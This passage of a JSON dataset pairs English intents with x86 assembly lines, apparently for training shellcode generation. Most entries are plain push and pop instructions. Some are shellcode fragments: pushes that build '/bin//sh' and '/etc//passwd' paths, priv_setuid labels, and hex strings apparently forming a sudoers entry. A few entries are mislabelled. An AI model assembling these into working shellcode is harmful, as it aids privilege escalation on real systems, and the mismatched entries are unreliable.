      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "put syscall value into eax",
    "rewritten_intent": "put syscall value into eax",
    "snippet": "pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore eax from the value we pushed onto the stack at the start",
    "rewritten_intent": "restore eax from the value we pushed onto the stack at the start",
    "snippet": "pop eax",
    "slot_map": {
      "eax": "var0",
      "we": "var1"
    },
    "intent_tokens": [
      "restore",
      "var0",
      "value",
      "var1",
      "pushed",
      "stack",
      "start"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the original value of eax",
    "rewritten_intent": "restore the original value of eax",
    "snippet": "pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "restore",
      "original",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into eax register",
    "rewritten_intent": "restore the top of the stack into eax register",
    "snippet": "pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into the eax register",
    "rewritten_intent": "restore the top of the stack into the eax register",
    "snippet": "pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "pop the top of the stack into the eax register",
    "rewritten_intent": "pop the top of the stack into the eax register",
    "snippet": "pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "pop",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "remove last character from the stack into edx",
    "rewritten_intent": "remove last character from the stack into edx",
    "snippet": "pop eax",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "remove",
      "last",
      "character",
      "stack",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "eax"
    ]
  },
  {
    "intent": "pop the next argument off the stack into eax",
    "rewritten_intent": "pop the next argument off the stack into eax",
    "snippet": "pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "pop",
      "next",
      "argument",
      "off",
      "stack",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "remove last character from the stack into eax",
    "rewritten_intent": "remove last character from the stack into eax",
    "snippet": "pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "remove",
      "last",
      "character",
      "stack",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore ebp register",
    "rewritten_intent": "restore ebp register",
    "snippet": "pop ebp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "restore",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into the ebp register",
    "rewritten_intent": "restore the top of the stack into the ebp register",
    "snippet": "pop ebp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore ebx from the value we pushed onto the stack at the start",
    "rewritten_intent": "restore ebx from the value we pushed onto the stack at the start",
    "snippet": "pop ebx",
    "slot_map": {
      "ebx": "var0",
      "we": "var1"
    },
    "intent_tokens": [
      "restore",
      "var0",
      "value",
      "var1",
      "pushed",
      "stack",
      "start"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the original value of ebx",
    "rewritten_intent": "restore the original value of ebx",
    "snippet": "pop ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "restore",
      "original",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into ebx register",
    "rewritten_intent": "restore the top of the stack into ebx register",
    "snippet": "pop ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into the ebx register",
    "rewritten_intent": "restore the top of the stack into the ebx register",
    "snippet": "pop ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "remove last character from the stack into ebx",
    "rewritten_intent": "remove last character from the stack into ebx",
    "snippet": "pop ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "remove",
      "last",
      "character",
      "stack",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "pop the value on the stack back into ebx",
    "rewritten_intent": "pop the value on the stack back into ebx",
    "snippet": "pop ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "pop",
      "value",
      "stack",
      "back",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "remove last character from the stack into ecx",
    "rewritten_intent": "remove last character from the stack into ecx",
    "snippet": "pop ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "remove",
      "last",
      "character",
      "stack",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore ecx from the value we pushed onto the stack at the start",
    "rewritten_intent": "restore ecx from the value we pushed onto the stack at the start",
    "snippet": "pop ecx",
    "slot_map": {
      "ecx": "var0",
      "we": "var1"
    },
    "intent_tokens": [
      "restore",
      "var0",
      "value",
      "var1",
      "pushed",
      "stack",
      "start"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore ecx register",
    "rewritten_intent": "restore ecx register",
    "snippet": "pop ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "restore",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "pop the value on the stack back into ecx",
    "rewritten_intent": "pop the value on the stack back into ecx",
    "snippet": "pop ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "pop",
      "value",
      "stack",
      "back",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into the ecx register",
    "rewritten_intent": "restore the top of the stack into the ecx register",
    "snippet": "pop ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit",
    "rewritten_intent": "restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit",
    "snippet": "pop ecx \\n loop l1 \\n mov eax, 1",
    "slot_map": {
      "ecx": "var0",
      "l1": "var3"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register",
      "then",
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var3",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "make",
      "system",
      "call",
      "exit"
    ],
    "snippet_tokens": [
      "pop",
      "var0",
      "\\n",
      "loop",
      "var3",
      "\\n",
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit",
    "rewritten_intent": "restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit",
    "snippet": "pop ecx \\n loop l2 \\n mov eax, 1",
    "slot_map": {
      "ecx": "var0",
      "l2": "var3"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register",
      "then",
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var3",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "make",
      "system",
      "call",
      "exit"
    ],
    "snippet_tokens": [
      "pop",
      "var0",
      "\\n",
      "loop",
      "var3",
      "\\n",
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit",
    "rewritten_intent": "restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit",
    "snippet": "pop ecx \\n loop l3 \\n mov eax, 1",
    "slot_map": {
      "ecx": "var0",
      "l3": "var3"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register",
      "then",
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var3",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "make",
      "system",
      "call",
      "exit"
    ],
    "snippet_tokens": [
      "pop",
      "var0",
      "\\n",
      "loop",
      "var3",
      "\\n",
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "pop the top element of the stack into edi",
    "rewritten_intent": "pop the top element of the stack into edi",
    "snippet": "pop edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "pop",
      "top",
      "element",
      "stack",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into the edi register",
    "rewritten_intent": "restore the top of the stack into the edi register",
    "snippet": "pop edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore edx from the value we pushed onto the stack at the start",
    "rewritten_intent": "restore edx from the value we pushed onto the stack at the start",
    "snippet": "pop edx",
    "slot_map": {
      "edx": "var0",
      "we": "var1"
    },
    "intent_tokens": [
      "restore",
      "var0",
      "value",
      "var1",
      "pushed",
      "stack",
      "start"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into edx register",
    "rewritten_intent": "restore the top of the stack into edx register",
    "snippet": "pop edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into the edx register",
    "rewritten_intent": "restore the top of the stack into the edx register",
    "snippet": "pop edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "pop the top of the stack into the edx register",
    "rewritten_intent": "pop the top of the stack into the edx register",
    "snippet": "pop edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "pop",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore esi from the value we pushed onto the stack at the start",
    "rewritten_intent": "restore esi from the value we pushed onto the stack at the start",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0",
      "we": "var1"
    },
    "intent_tokens": [
      "restore",
      "var0",
      "value",
      "var1",
      "pushed",
      "stack",
      "start"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "store the shellcode pointer to esi",
    "rewritten_intent": "store the shellcode pointer to esi",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "store",
      "shellcode",
      "pointer",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "save the shellcode in the esi register",
    "rewritten_intent": "save the shellcode in the esi register",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "save",
      "shellcode",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "load the shellcode in esi",
    "rewritten_intent": "load the shellcode in esi",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "load",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "encoded shellcode in esi",
    "rewritten_intent": "encoded shellcode in esi",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "encoded",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "save the address of the shellcode in esi",
    "rewritten_intent": "save the address of the shellcode in esi",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "save",
      "address",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "pop the address of the shellcode in the esi register",
    "rewritten_intent": "pop the address of the shellcode in the esi register",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "pop",
      "address",
      "shellcode",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "store the pointer to the shellcode into esi",
    "rewritten_intent": "store the pointer to the shellcode into esi",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "store",
      "pointer",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "pop the shellcode in esi and save it into dx",
    "rewritten_intent": "pop the shellcode in esi and save it into dx",
    "snippet": "pop esi \\n mov dx, [esi]",
    "slot_map": {
      "esi": "var0",
      "dx": "var1"
    },
    "intent_tokens": [
      "pop",
      "shellcode",
      "var0",
      "and",
      "save",
      "it",
      "var1"
    ],
    "snippet_tokens": [
      "pop",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "restore the top of the stack into the esp register",
    "rewritten_intent": "restore the top of the stack into the esp register",
    "snippet": "pop esp",
    "slot_map": {},
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "esp"
    ]
  },
  {
    "intent": "restore the top of the stack into the si register",
    "rewritten_intent": "restore the top of the stack into the si register",
    "snippet": "pop si",
    "slot_map": {},
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "si",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "si"
    ]
  },
  {
    "intent": "move doublewords from the stack into the 32 bit registers",
    "rewritten_intent": "move doublewords from the stack into the 32 bit registers",
    "snippet": "popad",
    "slot_map": {
      "doublewords": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "stack",
      "32",
      "bit",
      "registers"
    ],
    "snippet_tokens": [
      "popad"
    ]
  },
  {
    "intent": "move doublewords from the stack into the general purpose registers",
    "rewritten_intent": "move doublewords from the stack into the general purpose registers",
    "snippet": "popad",
    "slot_map": {
      "doublewords": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "stack",
      "general",
      "purpose",
      "registers"
    ],
    "snippet_tokens": [
      "popad"
    ]
  },
  {
    "intent": "pop doublewords from the stack into the general purpose registers",
    "rewritten_intent": "pop doublewords from the stack into the general purpose registers",
    "snippet": "popad",
    "slot_map": {
      "doublewords": "var0"
    },
    "intent_tokens": [
      "pop",
      "var0",
      "stack",
      "general",
      "purpose",
      "registers"
    ],
    "snippet_tokens": [
      "popad"
    ]
  },
  {
    "intent": "define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77",
    "rewritten_intent": "define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77",
    "snippet": "port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77",
    "slot_map": {
      "0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77": "var0"
    },
    "intent_tokens": [
      "define",
      "port",
      "array",
      "5",
      "bytes",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "port",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77",
    "rewritten_intent": "define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77",
    "snippet": "port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77",
    "slot_map": {
      "0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77": "var0"
    },
    "intent_tokens": [
      "define",
      "port",
      "array",
      "bytes",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "port",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "declare the prepare label",
    "rewritten_intent": "declare the prepare label",
    "snippet": "prepare:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "prepare",
      "label"
    ],
    "snippet_tokens": [
      "prepare",
      ":"
    ]
  },
  {
    "intent": "declare the priv_setgid label",
    "rewritten_intent": "declare the priv_setgid label",
    "snippet": "priv_setgid:",
    "slot_map": {
      "priv_setgid": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the priv_setuid label",
    "rewritten_intent": "declare the priv_setuid label",
    "snippet": "priv_setuid:",
    "slot_map": {
      "priv_setuid": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the process_shellcode label",
    "rewritten_intent": "declare the process_shellcode label",
    "snippet": "process_shellcode:",
    "slot_map": {
      "process_shellcode": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "push _ip onto the stack",
    "rewritten_intent": "push _ip onto the stack",
    "snippet": "push _ip",
    "slot_map": {
      "_ip": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push '//pa' onto the stack",
    "rewritten_intent": "push '//pa' onto the stack",
    "snippet": "push '//pa'",
    "slot_map": {
      "'//pa'": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push '//sh' onto the stack",
    "rewritten_intent": "push '//sh' onto the stack",
    "snippet": "push '//sh'",
    "slot_map": {
      "'//sh'": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push '/bin' onto the stack",
    "rewritten_intent": "push '/bin' onto the stack",
    "snippet": "push '/bin'",
    "slot_map": {
      "'/bin'": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push '/etc' onto the stack",
    "rewritten_intent": "push '/etc' onto the stack",
    "snippet": "push '/etc'",
    "slot_map": {
      "'/etc'": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 'sswd' onto the stack",
    "rewritten_intent": "push 'sswd' onto the stack",
    "snippet": "push 'sswd'",
    "slot_map": {
      "'sswd'": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 4 bytes at address tmp onto stack",
    "rewritten_intent": "push the 4 bytes at address tmp onto stack",
    "snippet": "push [tmp]",
    "slot_map": {
      "tmp": "var0"
    },
    "intent_tokens": [
      "push",
      "4",
      "bytes",
      "address",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "push the 4 bytes at address var onto the stack",
    "rewritten_intent": "push the 4 bytes at address var onto the stack",
    "snippet": "push [var]",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "4",
      "bytes",
      "address",
      "var",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "push the 4 bytes at address var2 onto the stack",
    "rewritten_intent": "push the 4 bytes at address var2 onto the stack",
    "snippet": "push [var2]",
    "slot_map": {
      "var2": "var0"
    },
    "intent_tokens": [
      "push",
      "4",
      "bytes",
      "address",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "push 0bh onto the stack",
    "rewritten_intent": "push 0bh onto the stack",
    "snippet": "push 0bh",
    "slot_map": {
      "0bh": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x0 to the stack",
    "rewritten_intent": "push the value 0x0 to the stack",
    "snippet": "push 0x0",
    "slot_map": {
      "0x0": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x0 onto the stack",
    "rewritten_intent": "push 0x0 onto the stack",
    "snippet": "push 0x0",
    "slot_map": {
      "0x0": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x04020a0a onto the stack",
    "rewritten_intent": "push 0x04020a0a onto the stack",
    "snippet": "push 0x04020a0a",
    "slot_map": {
      "0x04020a0a": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x0a206873 onto the stack",
    "rewritten_intent": "push 0x0a206873 onto the stack",
    "snippet": "push 0x0a206873",
    "slot_map": {
      "0x0a206873": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x0a3a7964 onto the stack",
    "rewritten_intent": "push 0x0a3a7964 onto the stack",
    "snippet": "push 0x0a3a7964",
    "slot_map": {
      "0x0a3a7964": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x0a4c4c41 onto the stack",
    "rewritten_intent": "push the value 0x0a4c4c41 onto the stack",
    "snippet": "push 0x0a4c4c41",
    "slot_map": {
      "0x0a4c4c41": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x0a4c4c41 onto the stack",
    "rewritten_intent": "push 0x0a4c4c41 onto the stack",
    "snippet": "push 0x0a4c4c41",
    "slot_map": {
      "0x0a4c4c41": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x1 onto the stack",
    "rewritten_intent": "push the value 0x1 onto the stack",
    "snippet": "push 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x1 to the stack",
    "rewritten_intent": "push 0x1 to the stack",
    "snippet": "push 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x1 onto the stack",
    "rewritten_intent": "push 0x1 onto the stack",
    "snippet": "push 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x10 onto the stack",
    "rewritten_intent": "push 0x10 onto the stack",
    "snippet": "push 0x10",
    "slot_map": {
      "0x10": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x10 to the stack",
    "rewritten_intent": "push 0x10 to the stack",
    "snippet": "push 0x10",
    "slot_map": {
      "0x10": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x10 onto the stack",
    "rewritten_intent": "push the 0x10 onto the stack",
    "snippet": "push 0x10",
    "slot_map": {
      "0x10": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x10 onto the stack",
    "rewritten_intent": "push the value 0x10 onto the stack",
    "snippet": "push 0x10",
    "slot_map": {
      "0x10": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x16 onto the stack",
    "rewritten_intent": "push the value 0x16 onto the stack",
    "snippet": "push 0x16",
    "slot_map": {
      "0x16": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x1a onto the stack",
    "rewritten_intent": "push the value 0x1a onto the stack",
    "snippet": "push 0x1a",
    "slot_map": {
      "0x1a": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x1a to the stack",
    "rewritten_intent": "push the value 0x1a to the stack",
    "snippet": "push 0x1a",
    "slot_map": {
      "0x1a": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x1c onto the stack",
    "rewritten_intent": "push the value 0x1c onto the stack",
    "snippet": "push 0x1c",
    "slot_map": {
      "0x1c": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x1c to the stack",
    "rewritten_intent": "push the value 0x1c to the stack",
    "snippet": "push 0x1c",
    "slot_map": {
      "0x1c": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2 onto the stack",
    "rewritten_intent": "push 0x2 onto the stack",
    "snippet": "push 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2 to the stack",
    "rewritten_intent": "push 0x2 to the stack",
    "snippet": "push 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x2 onto the stack",
    "rewritten_intent": "push the 0x2 onto the stack",
    "snippet": "push 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x203a4457 onto the stack",
    "rewritten_intent": "push the 0x203a4457 onto the stack",
    "snippet": "push 0x203a4457",
    "slot_map": {
      "0x203a4457": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x203a4457 onto the stack",
    "rewritten_intent": "push 0x203a4457 onto the stack",
    "snippet": "push 0x203a4457",
    "slot_map": {
      "0x203a4457": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x204c4c41 onto the stack",
    "rewritten_intent": "push 0x204c4c41 onto the stack",
    "snippet": "push 0x204c4c41",
    "slot_map": {
      "0x204c4c41": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x204c4c41 onto the stack",
    "rewritten_intent": "push the 0x204c4c41 onto the stack",
    "snippet": "push 0x204c4c41",
    "slot_map": {
      "0x204c4c41": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2431243a onto the stack",
    "rewritten_intent": "push 0x2431243a onto the stack",
    "snippet": "push 0x2431243a",
    "slot_map": {
      "0x2431243a": "var0"
    },
    "intent_tokens": [
      "push",
